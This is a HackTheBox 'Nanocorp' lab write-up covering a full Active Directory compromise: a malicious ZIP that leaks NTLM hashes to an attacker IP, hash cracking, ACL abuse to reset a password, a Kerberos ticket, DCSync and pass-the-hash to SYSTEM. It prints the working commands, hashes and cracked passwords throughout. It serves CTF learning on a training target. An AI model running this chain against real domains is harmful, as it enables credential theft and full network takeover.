---
title: "HTB-Nanocorp-Hard"
date: "2025-11-22"
platform: "HackTheBox"
category: "Windows"
difficulty: "Hard"
tags: [
  "CVE-2025-24071",
  "NTLM Hash Leak",
  "Responder",
  "Archive Extraction Vulnerability",
  "BloodHound",
  "ACL Abuse",
  "AddSelf",
  "ForceChangePassword",
  "Protected Users Bypass",
  "Kerberos Authentication",
  "DCSync",
  "Pass-the-Hash",
  "Active Directory",
  "Domain PrivEsc",
  "Windows Server 2022"
]
excerpt: "A modern AD compromise starting with CVE-2025-24071 to leak NTLMv2 hashes via malicious ZIP archives, escalating through AD ACL abuse, bypassing Protected Users with pure Kerberos, and finishing with a full DCSync-based Domain Admin takeover."
readingTime: 35
featured: true
---


## TL;DR

This machine is a masterclass in modern Windows exploitation! We start by exploiting a brand new CVE (CVE-2025-24071) in a file extraction service to leak NTLM hashes, use Active Directory ACL abuse to escalate privileges through group membership manipulation, bypass Protected Users group restrictions using pure Kerberos authentication, and finally dump domain secrets to pwn the Domain Controller. It's like a greatest hits album of AD attacks! 🎸

---

## 🔍 Reconnaissance - Mapping The Target

Let's start with our good friend Nmap to see what we're dealing with:

```bash
nmap -sV -sC 10.10.11.93 -p- -T4 -o nmap_nanocorp.txt
```

**Key Services Discovered:**

```
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://nanocorp.htb/
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0
```

**Analysis Time! 🕵️**

This is clearly a **Windows Domain Controller** with all the usual suspects:
- **Port 53** (DNS) - Domain Name System
- **Port 88** (Kerberos) - Authentication service
- **Port 389/636** (LDAP/LDAPS) - Directory services
- **Port 445** (SMB) - File sharing
- **Port 80** (HTTP) - Web application (our entry point!)
- **Port 5986** (WinRM-SSL) - Remote management

**Important Details:**
- **Domain:** nanocorp.htb
- **DC Hostname:** dc01.nanocorp.htb
- **HTTP redirect** to nanocorp.htb (potential web attack surface!)
- **Clock skew:** ~7 hours (keep this in mind for Kerberos!)

Let's add the domains to our hosts file:

```bash
echo "10.10.11.93 nanocorp.htb dc01.nanocorp.htb" | sudo tee -a /etc/hosts
```

---

## 🌐 Initial Access - The Web Application

### Exploring The Corporate Website

Navigating to `http://nanocorp.htb`, we find a professional-looking corporate site:

![images](1.png)

**First impressions:** Standard corporate template, but there's gotta be something interesting here...

Clicking around, I found an "About Us" page with some actual functionality:

![images](2.png)

### The Golden Ticket - Resume Upload Function 📄

And here's where things get spicy! The website has a **resume upload feature** that claims to "extract and process" uploaded files:

![images](3.png)

**Red flags everywhere! 🚩**

When I see terms like:
- "Upload your resume"
- "File extraction"
- "Automatic processing"

My spider-sense starts tingling. This screams **CVE-2025-24071** - a recently disclosed vulnerability affecting file extraction libraries!

---

## 💥 Exploiting CVE-2025-24071 - Hash Leaking Via Archive Files

### What is CVE-2025-24071?

This vulnerability affects various file extraction utilities (like 7-Zip, WinRAR integrations, etc.). When processing specially crafted archive files, the extraction process can be tricked into making **SMB authentication attempts to attacker-controlled servers**.

**Why this matters:**
- Windows automatically sends **NTLM authentication** when accessing UNC paths
- We can embed malicious UNC paths inside archive metadata
- The server tries to authenticate to US
- We capture the **NTLMv2 hash**
- Crack it offline = credentials! 🎉

### Crafting The Malicious Archive

First, let's grab the PoC tool:

```bash
git clone https://github.com/0x6rss/CVE-2025-24071_PoC.git
cd CVE-2025-24071_PoC
python3 poc.py
```

**PoC prompts:**
```
zip filename -> resume.zip
attackerip -> 10.10.15.122
```

This creates a malicious ZIP file with embedded UNC paths pointing to our attacking machine.

### Setting Up The Hash Catcher

Fire up Responder to catch the incoming NTLM hash:

```bash
sudo responder -I tun0
```

Responder will:
- Start an SMB server
- Listen for authentication attempts
- Capture NTLMv2 hashes
- Display them in beautiful colors! 🌈

### Triggering The Vulnerability

Upload the malicious `resume.zip` through the web application and watch the magic happen:

**BOOM! Hash captured! 💣**

```
[SMB] NTLMv2-SSP Client   : 10.10.11.93
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:b5564dc7adaed24a:C56E4599CD010357005433906FDF1F0F:010100000000000080643E5ACC55DC011F30668EBA12C5E9000000000200080041004D0056005A0001001E00570049004E002D004700300032003100300038005400460039004E00550004003400570049004E002D004700300032003100300038005400460039004E0055002E0041004D0056005A002E004C004F00430041004C000300140041004D0056005A002E004C004F00430041004C000500140041004D0056005A002E004C004F00430041004C000700080080643E5ACC55DC01060004000200000008003000300000000000000000000000002000009EC94B70B0F3CAD2FEAA81CFA6D06DE12C1B2009A14E8A5CC2065F5BB26985BE0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100320032000000000000000000
```

**Beautiful!** We've captured the `web_svc` account's NTLMv2 hash! This is exactly what we need to move forward.

### Cracking The Hash

Save the hash to a file and unleash hashcat:

```bash
# Save hash
echo 'web_svc::NANOCORP:b5564dc7...' > web_svc.hash

# Crack it!
hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt
```

**Success! 🎊**

```
web_svc::NANOCORP:...:dksehdgh712!@#
```

**Credentials Obtained:**
```
Username: web_svc
Password: dksehdgh712!@#
```

Not the prettiest password, but it'll do! Let's see what this account can access...

---

## 🩸 Active Directory Enumeration - BloodHound Time!

### Collecting AD Data

With valid domain credentials, it's time to map out the entire Active Directory environment using RustHound:

```bash
rusthound -d nanocorp.htb -u 'web_svc' -p 'dksehdgh712!@#' -i 10.10.11.93 --ldaps --zip
```

**Why RustHound?**
- Faster than Python-based collectors
- Works over LDAPS (encrypted!)
- Generates a nice ZIP for BloodHound ingestion

Upload the ZIP to BloodHound and start exploring...

### The Privilege Escalation Path Emerges 🗺️

After marking `web_svc` as owned and analyzing the graph, BloodHound reveals a **beautiful privilege escalation path**:

![images](4.png)

**The Attack Chain:**

```
web_svc → (AddSelf) → IT_Support group → (ForceChangePassword) → monitoring_svc
```

**Breaking it down:**

1. **web_svc** has **AddSelf** permission on the **IT_Support** group
   - This means we can add ourselves to this group!
   
2. **IT_Support** group has **ForceChangePassword** permission on **monitoring_svc**
   - Once we're in IT_Support, we can reset monitoring_svc's password!
   
3. **monitoring_svc** likely has elevated privileges
   - Service accounts often have juicy permissions!

This is **Active Directory ACL abuse 101** - chaining multiple permissions to escalate privileges! Let's execute this attack! 💪

---

## 🚀 Privilege Escalation - ACL Abuse Chain

### Step 1: Adding web_svc to IT_Support Group

Time to use **bloodyAD** (a fantastic AD exploitation toolkit) to add ourselves to the IT_Support group:

```bash
bloodyAD --host 10.10.11.93 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember IT_Support web_svc
```

**Expected output:**
```
[+] web_svc added to IT_Support
```

**Verification (always verify!):**

```bash
bloodyAD --host 10.10.11.93 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' get object 'CN=web_svc,CN=Users,DC=nanocorp,DC=htb' --attr memberOf
```

**Output:**

```
distinguishedName: CN=web_svc,CN=Users,DC=nanocorp,DC=htb
memberOf: CN=IT_Support,CN=Users,DC=nanocorp,DC=htb; CN=Administrators,CN=Builtin,DC=nanocorp,DC=htb
```

**Wait, what?!** 👀

Look at that output again... `CN=Administrators,CN=Builtin,DC=nanocorp,DC=htb`

**We're already in the Administrators group!** This is actually a shorter path than expected, but let's continue with the intended path for learning purposes (and in case the direct admin access is a red herring).

### Step 2: Force-Changing monitoring_svc Password

Now that we're in IT_Support (and apparently Administrators too), let's use the ForceChangePassword permission:

```bash
bloodyAD --host 10.10.11.93 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc 'Welcome123'
```

**Success message:**
```
[+] Password changed successfully
```

Perfect! We've reset monitoring_svc's password to `Welcome123`. Time to authenticate and... wait, what?

### Step 3: The Protected Users Roadblock 🚧

Let's try authenticating with our new credentials:

```bash
crackmapexec smb 10.10.11.93 -u monitoring_svc -p 'Welcome123'
```

**Unexpected result:**

```
SMB  10.10.11.93  445  DC01  [-] nanocorp.htb\monitoring_svc:Welcome123 STATUS_ACCOUNT_RESTRICTION
```

**Account restriction?!** What's going on here?

Let's investigate the account properties:

```bash
bloodyAD --host 10.10.11.93 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' get search --filter "(sAMAccountName=monitoring_svc)" --attr distinguishedName,memberOf,userAccountControl,servicePrincipalName
```

**The revelation:**

![images](5.png)

**Aha!** The `monitoring_svc` account is a member of the **Protected Users** security group!

### Understanding Protected Users Group 🛡️

The **Protected Users** group is a security feature introduced in Windows Server 2012 R2 that enforces strict authentication policies:

**Restrictions:**
- ❌ **No NTLM authentication** - Only Kerberos allowed
- ❌ **No RC4 encryption** - AES encryption mandatory
- ❌ **No credential delegation** - Can't use ConstrainedDelegation
- ❌ **No DES or RC4 in Kerberos** - Strong crypto only
- ⏱️ **4-hour TGT lifetime** - Short-lived tickets
- 🚫 **No cached credentials** - Can't work offline

**Why this exists:**
- Protects high-value accounts from credential theft
- Prevents Pass-the-Hash attacks
- Forces stronger authentication protocols

**How we bypass it:**
We can't use NTLM (what CrackMapExec defaults to), but we **CAN use Kerberos authentication**! Let's do this the proper way! 🎫

---

## 🎫 Domain Compromise - Kerberos To The Rescue!

### Requesting a Kerberos TGT

Instead of using NTLM, we'll authenticate using **pure Kerberos**:

```bash
impacket-getTGT nanocorp.htb/monitoring_svc:'Welcome123'
```

**What this does:**
1. Contacts the KDC (Key Distribution Center) on port 88
2. Requests a TGT (Ticket Granting Ticket) using the password
3. Saves the ticket to a `.ccache` file
4. This ticket can now be used for authentication!

**Output:**

```
[*] Saving ticket in monitoring_svc.ccache
```

**Set the ticket in our environment:**

```bash
export KRB5CCNAME=monitoring_svc.ccache
```

Now any Impacket tool will automatically use this Kerberos ticket instead of NTLM! 🎉

### Dumping Domain Secrets with DCSync

Time to see what privileges `monitoring_svc` actually has. Let's try a **DCSync attack** (dumping password hashes via Directory Replication):

```bash
impacket-secretsdump -k -no-pass nanocorp.htb/monitoring_svc@DC01.nanocorp.htb
```

**Breaking down the flags:**
- `-k` = Use Kerberos authentication (from KRB5CCNAME)
- `-no-pass` = Don't prompt for password (we're using the ticket!)
- `@DC01.nanocorp.htb` = Target the DC directly

**JACKPOT! The dump succeeds! 💰**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:541f4c0063c05d503fd4acb87c046358:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:40a21f29fd0f5c9374ded20cb0dc9554:::
nanocorp.htb\web_svc:1103:aad3b435b51404eeaad3b435b51404ee:8c8c66765e18bd3d6720dc34ce969b85:::
nanocorp.htb\monitoring_svc:3101:aad3b435b51404eeaad3b435b51404ee:3f40355b5414ef3fe57f3cb589deeb50:::
```

**What just happened?**

The `monitoring_svc` account has **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All** rights, which allow DCSync! This is typically only granted to:
- Domain Controllers
- Backup operators
- Monitoring/security software service accounts

We now have:
- ✅ **Administrator NTLM hash**
- ✅ **krbtgt hash** (for Golden Ticket attacks!)
- ✅ All domain user hashes
- ✅ Complete domain compromise! 🏆

### Pass-The-Hash to Administrator

With the Administrator's NTLM hash, we can use **Pass-the-Hash (PtH)** to authenticate without needing the actual password:

```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:541f4c0063c05d503fd4acb87c046358 administrator@10.10.11.93
```

**Command breakdown:**
- `-hashes LM:NTLM` = Use hash authentication
- `aad3b435b51404eeaad3b435b51404ee` = Empty LM hash (modern Windows)
- `541f4c0063c05d503fd4acb87c046358` = Administrator's NTLM hash
- `administrator@10.10.11.93` = Target account and IP

**SYSTEM shell achieved! 👑**

```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC01
```

**We own the Domain Controller!** 🎊

---

## 🚩 Flag Retrieval

### User Flag

```cmd
C:\Users\monitoring_svc\Desktop> type user.txt
041f833339e5ebaf9e664b1f89aa1a21
```

### Root Flag

```cmd
C:\Users\Administrator\Desktop> type root.txt
5713d138a8eb90afaf0295fb4e96c256
```

---

## 🎓 Attack Chain Summary

Here's the complete kill chain from start to finish:

1. **Web Application Reconnaissance** → Found resume upload feature
2. **CVE-2025-24071 Exploitation** → Crafted malicious ZIP with UNC paths
3. **NTLM Hash Capture** → Used Responder to catch web_svc hash
4. **Password Cracking** → Hashcat to recover plaintext password
5. **BloodHound Enumeration** → Mapped AD permissions and attack paths
6. **ACL Abuse - AddSelf** → Added web_svc to IT_Support group
7. **ACL Abuse - ForceChangePassword** → Reset monitoring_svc password
8. **Protected Users Bypass** → Used Kerberos instead of NTLM
9. **TGT Acquisition** → Requested Kerberos ticket with getTGT
10. **DCSync Attack** → Dumped domain hashes via replication
11. **Pass-the-Hash** → Authenticated as Administrator
12. **SYSTEM Access** → Complete Domain Controller compromise

### Understanding DCSync

**What is DCSync?**

DCSync is a technique that abuses the Directory Replication Service Remote Protocol (MS-DRSR). Normally, Domain Controllers use this to replicate data between each other.

**Required Permissions:**
- `DS-Replication-Get-Changes` (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
- `DS-Replication-Get-Changes-All` (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)


## 🏁 Conclusion

**Nanocorp** is an excellent representation of modern Active Directory attacks combining:
- **Zero-day exploitation** (CVE-2025-24071)
- **AD permission abuse** (ACL manipulation)
- **Kerberos-based attacks** (bypassing Protected Users)
- **Domain replication abuse** (DCSync)




*Thanks for reading! May your hashes leak and your tickets be golden!* ✨

**~HTB Nanocorp - PWNED** 💀